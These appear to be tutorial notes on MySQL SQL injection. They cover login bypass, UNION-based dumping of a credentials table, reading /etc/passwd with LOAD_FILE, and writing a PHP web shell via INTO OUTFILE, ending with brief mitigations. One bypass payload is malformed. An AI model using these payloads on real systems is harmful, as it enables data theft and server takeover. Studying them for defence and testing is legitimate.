# SQL Injection

Factors contributing to this vulnerability include:

- Lack of Awareness: Many developers may not be well-versed in security best practices, including how to prevent SQL injection.

- Rushed Development: Tight project deadlines can lead to shortcuts and inadequate security testing.

- Legacy Code: Older web applications might not have been built with modern security practices in mind.

- Insufficient Patching: Failing to keep software and frameworks up to date can expose applications to known vulnerabilities.

- Inadequate Testing: Some applications may lack comprehensive security testing and auditing.

MySQL Operator Precedence

    Division (/), Multiplication (*), and Modulus (%)
    Addition (+) and Subtraction (-)
    Comparison (=, >, <, <=, >=, !=, LIKE)
    NOT (!)
    AND (&&)
    OR (||)

## Local mysql server

`mysql.server start`

`mysql -u root`

In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as **In-band SQL injection**, and it has two types: Union Based and Error Based.

## Injections

Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. Test the following payloads to see if the page behaviour changes

| Payload | URL Encoded |
| ------- | ----------- |
| '       | %27         |
| "       | %22         |
| #       | %23         |
| ;       | %3B         |
| \)      | %29         |

### Auth bypass

#### OR Injection

The goal is to make the query always return true.

`'1'1='1`

#### Injection with comments

`admin')-- -`

[Authentication bypass paylods](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

#### Union

The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.

- The data types of the selected columns on all positions should be the same.
- A UNION statement can only operate on SELECT statements with an equal number of columns.

##### Filling out columns with junk data

- `SELECT 1 from passwords` will always return 1 as the output.
- `SELECT junk from passwords` will always return "junk" as the output.
- When filling other columns with junk data, we must ensure that the junk data type matches the columns data type, otherwise the query will return an error.
- It is good to use number as it can also become handy for tracking payloads positions.
- For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

##### Detecting a number of columns

###### ORDER BY

We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

e.g. `' order by 1-- -`, `' order by 2-- -`

###### UNION

`{column-value}' UNION select 1,2,3-- -`

`{column-value}' UNION select 1,2,3,4-- -`

If the result is successful then we have established a number of columns.

##### Location of injection

While a query may return multiple columns, the web application may only display some of them. We need to determine which columns are printed to the page, to determine where to place our injection.

The benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query.

`cn' UNION select 1,@@version,3,4-- -`

### Database enumeration

#### Mysql Fingerprinting

Before enumerating the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.

Can guess that if the webserver is Apache or Nginx, then the db is likely MySQL. Similarly if the webserver is IIS, then it could be MSSQL.

| Payload          | When to use                 | Expected output                                   | Wrong output                                              |
| ---------------- | --------------------------- | ------------------------------------------------- | --------------------------------------------------------- |
| SELECT @@version | we have full query output   | MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| SELECT POW(1,1)  | we only have numeric output | 1                                                 | Error with other DBMS                                     |
| SELECT SLEEP(5)  | Blind/No Output             | Delays page response for 5 seconds and returns 0. | Will not delay response with other DBMS                   |

#### Information_schema database

The [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) database contains metadata about the databases and tables present on the server.

To pull data from tables using UNION SELECT, we need to properly form our SELECT queries. To do so, we need the following information:

- List of databases
- List of tables within each database
- List of columns within each table

We need to use `.` notation to specify the database we want to use in the query.

#### Schemata

To start our enumeration, we should find what databases are available on the DBMS.

The table ` SCHEMATA` in the `INFORMATION_SCHEMA`database contains information about all databases on the server. The `SCHEMA_NAME` column contains all the database names currently present.

[Schemata columns reference](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)

List of databases

`cn' UNION select 1,schema_name,3,4 from information_schema.schemata-- -`

Get current database

`cn' UNION select 1,database(),2,3-- -`

#### Tables

Before we dump data from the chosen database, we need to get a list of the tables to query them with a SELECT statement.

The `TABLES` table in the `INFORMATION_SCHEMA` Database contains information about all tables throughout the database.

[Tables columns reference](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html)

Get tables in the database

`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`

#### Columns

The `COLUMNS` table in the `INFORMATION_SCHEMA` database contains information about all columns present in all the databases.

[Columns columns reference](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html)

List of columns in a table

`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

#### Data

`cn' UNION select 1, username, password, 4 from dev.credentials-- -`

## Reading files

SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.

### Privileges

in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files.

First step is gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

Keep in mind that the available privilege types and their specific functionality may vary depending on the MySQL version and the privileges granted by the database administrator. The exact set of privilege types can also be extended or customized in some cases to suit the specific needs of an application or database.

In the ` INFORMATION_SCHEMA` database, the `USER_PRIVILEGES` table contains information about privileges granted to database users

    GRANTEE: The user to whom the privilege is granted.
    TABLE_CATALOG: The name of the catalog (database) where the privilege is granted.
    PRIVILEGE_TYPE: The type of privilege, such as SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, and more.
    IS_GRANTABLE: Indicates whether the privilege is grantable to other users (YES or NO).

[Mysql Privilege reference](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html)

#### DB user

If the user has DBA privileges, then it is much more probable that they will have file-read privileges. If the user does not, then we have to check our privileges to see what we can do.

1. Determine which users we are within the database.

```
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

`cn' UNION SELECT 1, user(), 3, 4-- -`

`cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`

#### User privileges

Test if we have super admin privileges with the following query:

`SELECT super_priv FROM mysql.user`

`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`

`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'" -- -`

#### LOAD_FILE

The `LOAD_FILE()`` function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:

`SELECT LOAD_FILE('/etc/passwd');`

We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

This vulnerability can be used to leak source code as well.

Example:

We know that the current page is search.php. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.

`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/conn.php"), 3, 4-- -`

## Writting files

When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.

### Write File Priveleges

To be able to write files to the back-end server using a MySQL database, we require three things:

- User with `FILE`` privilege enabled
- MySQL global `secure_file_priv`` variable not enabled
- Write access to the location we want to write to on the back-end server

#### [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv)

The `secure_file_priv`` variable is used to determine where to read/write files from.

- An empty value lets us read files from the entire file system.
- NULL means we cannot read/write from any directory.
- MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege.
- MySQL uses `/var/lib/mysql-files` as the default folder. This means that reading files through a MySQL injection isn't possible with default settings.
- Some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.

`SHOW VARIABLES LIKE 'secure_file_priv';`

MySQL global variables are stored in a table called [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns variable_name and variable_value.

`SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`

`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

#### [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/)

The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

    SELECT * from users INTO OUTFILE '/tmp/credentials';

Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

#### Writing Files through SQL Injection

Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

    cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

##### Writing a web shell

`<?php system($_REQUEST[0]); ?>`

`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

## Mitigating SQL Injection

- Sanitizing any user input
- Validating user input
- We should ensure that the user querying the database only has minimum permissions.
- parametrized queries
- web application firewall, e.g. Cloudflare
